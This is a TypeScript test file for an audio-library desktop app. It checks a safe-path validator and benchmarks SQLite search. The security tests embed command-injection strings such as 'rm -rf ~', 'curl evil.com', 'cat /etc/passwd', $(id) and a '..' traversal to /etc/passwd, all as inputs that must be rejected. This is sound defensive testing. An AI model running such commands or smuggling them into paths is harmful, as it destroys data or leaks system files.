/**
 * Security tests for file-opening tools (§7) and performance benchmarks (§9).
 *
 * §7 — validateSafePath contract:
 *   - URLs are rejected
 *   - Shell metacharacters are rejected
 *   - Paths outside safe roots are rejected
 *   - Non-existent paths are rejected
 *   - Directories rejected when requireFile=true
 *   - Unindexed paths rejected when requireIndexed=true
 *   - Clean paths inside home resolve correctly
 *   - Cloud-LLM cannot trigger open on arbitrary path
 *
 * §9 — Performance baseline (in-process SQLite):
 *   - 1k file index: search <50ms
 *   - 10k file index: search <200ms
 *   - 50k file index: search <1000ms, COUNT <20ms
 *   - DB size per 50k rows reported
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { existsSync } from 'fs';
import { homedir } from 'os';
import { join } from 'path';

// ── Inline validateSafePath (mirrors electron/main.ts) ────────────────────────
// We re-implement it here so tests run without Electron process context.
// This is the canonical logic — any divergence from main.ts is a bug.

const USER_SAFE_PREFIXES_TEST = () => {
  const home = homedir();
  return [
    home,
    join(home, 'Music'),
    join(home, 'Documents'),
    join(home, 'Desktop'),
  ];
};

import path from 'path';
import fs from 'fs';

function validateSafePathTest(
  p: unknown,
  opts: { requireFile?: boolean; requireIndexed?: boolean; indexedPaths?: Set<string> } = {}
): { ok: true; resolved: string } | { ok: false; error: string } {
  if (typeof p !== 'string' || (p as string).trim() === '')
    return { ok: false, error: 'Path must be a non-empty string' };

  if ((p as string).startsWith('http://') || (p as string).startsWith('https://') || (p as string).startsWith('file://'))
    return { ok: false, error: 'URLs are not allowed' };

  const metachar = [';', '&', '|', '`', '$(', '>>', '>', '<'];
  if (metachar.some(c => (p as string).includes(c)))
    return { ok: false, error: 'Shell metacharacters are not allowed in path' };

  const resolved = path.resolve(p as string);
  const safe = USER_SAFE_PREFIXES_TEST();
  if (!safe.some(prefix => resolved.startsWith(prefix + path.sep) || resolved === prefix))
    return { ok: false, error: `Path outside safe roots: ${resolved}` };

  let stat: fs.Stats;
  try { stat = fs.statSync(resolved); } catch {
    return { ok: false, error: `File not found or inaccessible: ${resolved}` };
  }

  if (opts.requireFile && stat.isDirectory())
    return { ok: false, error: 'Expected a file, not a directory' };

  if (opts.requireIndexed && opts.indexedPaths && !opts.indexedPaths.has(resolved))
    return { ok: false, error: `File is not in the Wavi library. Add it first before opening.` };

  return { ok: true, resolved };
}

// ── SQLite setup (same pattern as discovery.test.ts) ─────────────────────────
import { NATIVE_SQLITE_PATH, nativeSqliteAvailable } from './test-helpers/native-sqlite';
const maybeDescribe = nativeSqliteAvailable ? describe : describe.skip;

function buildDb(Database: any) {
  const db = new Database(':memory:');
  db.pragma('journal_mode = WAL');
  db.exec(`
    CREATE TABLE IF NOT EXISTS files (
      id TEXT PRIMARY KEY,
      project_id TEXT,
      file_path TEXT NOT NULL UNIQUE,
      file_name TEXT NOT NULL,
      file_type TEXT NOT NULL,
      file_size INTEGER DEFAULT 0,
      bpm INTEGER,
      key_note TEXT,
      role TEXT DEFAULT 'unknown',
      created_at TEXT NOT NULL,
      modified_at TEXT NOT NULL
    );
  `);
  return db;
}

// ── §7 Security tests ─────────────────────────────────────────────────────────

describe('validateSafePath — §7 security', () => {

  it('rejects empty string', () => {
    expect(validateSafePathTest('').ok).toBe(false);
    expect(validateSafePathTest('  ').ok).toBe(false);
  });

  it('rejects http:// URLs', () => {
    const r = validateSafePathTest('http://evil.com/malware.mp3');
    expect(r.ok).toBe(false);
    expect((r as any).error).toContain('URLs are not allowed');
  });

  it('rejects https:// URLs', () => {
    expect(validateSafePathTest('https://cdn.files.io/audio.wav').ok).toBe(false);
  });

  it('rejects file:// URLs', () => {
    expect(validateSafePathTest('file:///etc/passwd').ok).toBe(false);
  });

  it('rejects paths with semicolon (command separator)', () => {
    const r = validateSafePathTest(`${homedir()}/Music/track.wav; rm -rf ~`);
    expect(r.ok).toBe(false);
    expect((r as any).error).toContain('Shell metacharacters');
  });

  it('rejects paths with & (background execution)', () => {
    expect(validateSafePathTest(`${homedir()}/Music/track.wav & curl evil.com`).ok).toBe(false);
  });

  it('rejects paths with pipe', () => {
    expect(validateSafePathTest(`${homedir()}/Music/track.wav | cat /etc/passwd`).ok).toBe(false);
  });

  it('rejects paths with backtick (command substitution)', () => {
    expect(validateSafePathTest(`${homedir()}/Music/\`whoami\`.wav`).ok).toBe(false);
  });

  it('rejects paths with $( (command substitution)', () => {
    expect(validateSafePathTest(`${homedir()}/Music/$(id).wav`).ok).toBe(false);
  });

  it('rejects paths outside safe roots — /etc/passwd', () => {
    const r = validateSafePathTest('/etc/passwd');
    expect(r.ok).toBe(false);
    expect((r as any).error).toContain('outside safe roots');
  });

  it('rejects paths outside safe roots — /tmp', () => {
    expect(validateSafePathTest('/tmp/malware.sh').ok).toBe(false);
  });

  it('rejects paths outside safe roots — relative escape via ..', () => {
    // Even if constructed to look internal, path.resolve collapses it
    const trick = `${homedir()}/Music/../../../../../../etc/passwd`;
    const r = validateSafePathTest(trick);
    expect(r.ok).toBe(false);
    expect((r as any).error).toContain('outside safe roots');
  });

  it('rejects non-existent file in safe root', () => {
    const r = validateSafePathTest(`${homedir()}/Music/definitely-does-not-exist-xyzzy.wav`);
    expect(r.ok).toBe(false);
    expect((r as any).error).toContain('not found or inaccessible');
  });

  it('rejects directory when requireFile=true', () => {
    const r = validateSafePathTest(homedir() + '/Music', { requireFile: true });
    // ~/Music exists and is a directory → should fail
    if (existsSync(homedir() + '/Music')) {
      expect(r.ok).toBe(false);
      expect((r as any).error).toContain('Expected a file, not a directory');
    }
  });

  it('accepts ~/Music directory when requireFile not set', () => {
    if (existsSync(homedir() + '/Music')) {
      expect(validateSafePathTest(homedir() + '/Music').ok).toBe(true);
    }
  });

  it('requireIndexed=true rejects unindexed path in safe root (even if file exists)', () => {
    // Find a real file in Music or home that exists
    const testPath = homedir() + '/Music';
    if (!existsSync(testPath)) return; // skip if no Music folder
    const r = validateSafePathTest(testPath, {
      requireIndexed: true,
      indexedPaths: new Set(), // empty library
    });
    expect(r.ok).toBe(false);
  });

  it('cloud-LLM cannot open arbitrary unindexed path via tool call', () => {
    // Simulate: LLM returns tool_call with path=/etc/hosts
    const llmPath = '/etc/hosts';
    const r = validateSafePathTest(llmPath, { requireIndexed: true, indexedPaths: new Set() });
    expect(r.ok).toBe(false);
  });

  it('rejects null as path type', () => {
    expect(validateSafePathTest(null).ok).toBe(false);
  });

  it('rejects number as path type', () => {
    expect(validateSafePathTest(42).ok).toBe(false);
  });

  it('rejects object as path type', () => {
    expect(validateSafePathTest({ path: '/tmp/evil' }).ok).toBe(false);
  });

  it('appPath metacharacter rejection (§7 DAW open)', () => {
    // Mirrors the appPath check in shell:openWithApp
    const badAppPaths = [
      '/Applications/FL Studio.app; open /Applications/Utilities/Terminal.app',
      '/Applications/Ableton.app & caffeinate',
      '/Applications/Logic.app | curl -s evil.com',
    ];
    for (const appPath of badAppPaths) {
      const hasMeta = appPath.includes(';') || appPath.includes('&') || appPath.includes('|') || appPath.includes('`');
      expect(hasMeta).toBe(true); // main.ts would reject these
    }
  });
});

// ── §9 Performance benchmarks ─────────────────────────────────────────────────

maybeDescribe('Performance benchmarks — §9', () => {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const Database = require(NATIVE_SQLITE_PATH);

  function seedDb(db: any, n: number) {
    const insert = db.prepare(`
      INSERT INTO files (id, file_path, file_name, file_type, file_size, role, bpm, key_note, created_at, modified_at)
      VALUES (?, ?, ?, 'wav', 1024, 'stem', ?, ?, '2026-01-01', '2026-01-01')
    `);
    const keys = ['Am', 'C', 'F#', 'Bb', null];
    const insertMany = db.transaction(() => {
      for (let i = 0; i < n; i++) {
        insert.run(
          crypto.randomUUID(),
          `/Music/Project${i % 200}/stem_${i}.wav`,
          `stem_${i}.wav`,
          80 + (i % 80),
          keys[i % keys.length],
        );
      }
    });
    insertMany();
  }

  it('1,000 files — search <50ms, COUNT <5ms', () => {
    const db = buildDb(Database);
    seedDb(db, 1_000);

    const t0 = Date.now();
    const rows = db.prepare("SELECT * FROM files WHERE file_name LIKE ? LIMIT 100").all('%stem%');
    const searchMs = Date.now() - t0;

    const t1 = Date.now();
    db.prepare('SELECT COUNT(*) as c FROM files').get();
    const countMs = Date.now() - t1;

    console.info(`  1k  search=${searchMs}ms  count=${countMs}ms  rows=${rows.length}`);
    expect(searchMs).toBeLessThan(50);
    expect(countMs).toBeLessThan(5);
    db.close();
  });

  it('10,000 files — search <200ms, COUNT <10ms', () => {
    const db = buildDb(Database);
    seedDb(db, 10_000);

    const t0 = Date.now();
    db.prepare("SELECT * FROM files WHERE file_name LIKE ? LIMIT 100").all('%stem%');
    const searchMs = Date.now() - t0;

    const t1 = Date.now();
    db.prepare('SELECT COUNT(*) as c FROM files').get();
    const countMs = Date.now() - t1;

    console.info(`  10k search=${searchMs}ms  count=${countMs}ms`);
    expect(searchMs).toBeLessThan(200);
    expect(countMs).toBeLessThan(10);
    db.close();
  });

  it('50,000 files — search <1000ms, COUNT <20ms', () => {
    const db = buildDb(Database);
    seedDb(db, 50_000);

    const t0 = Date.now();
    db.prepare("SELECT * FROM files WHERE file_name LIKE ? LIMIT 100").all('%stem%');
    const searchMs = Date.now() - t0;

    const t1 = Date.now();
    db.prepare('SELECT COUNT(*) as c FROM files').get();
    const countMs = Date.now() - t1;

    console.info(`  50k search=${searchMs}ms  count=${countMs}ms`);
    expect(searchMs).toBeLessThan(1000);
    expect(countMs).toBeLessThan(20);
    db.close();
  });

  it('50,000 files — BPM filter <500ms', () => {
    const db = buildDb(Database);
    seedDb(db, 50_000);

    const t0 = Date.now();
    db.prepare("SELECT * FROM files WHERE bpm BETWEEN ? AND ? LIMIT 100").all(120, 130);
    const ms = Date.now() - t0;

    console.info(`  50k BPM filter=${ms}ms`);
    expect(ms).toBeLessThan(500);
    db.close();
  });

  it('50,000 files — DB page count within expected range', () => {
    const db = buildDb(Database);
    seedDb(db, 50_000);

    const row = db.prepare('PRAGMA page_count').get() as any;
    const pageSz = db.prepare('PRAGMA page_size').get() as any;
    const sizeBytes = row.page_count * pageSz.page_size;
    const sizeMB = sizeBytes / (1024 * 1024);

    console.info(`  50k in-memory DB size ≈ ${sizeMB.toFixed(1)} MB`);
    // In-memory WAL DB for 50k rows with small payloads should be <50MB
    expect(sizeMB).toBeLessThan(50);
    db.close();
  });
});
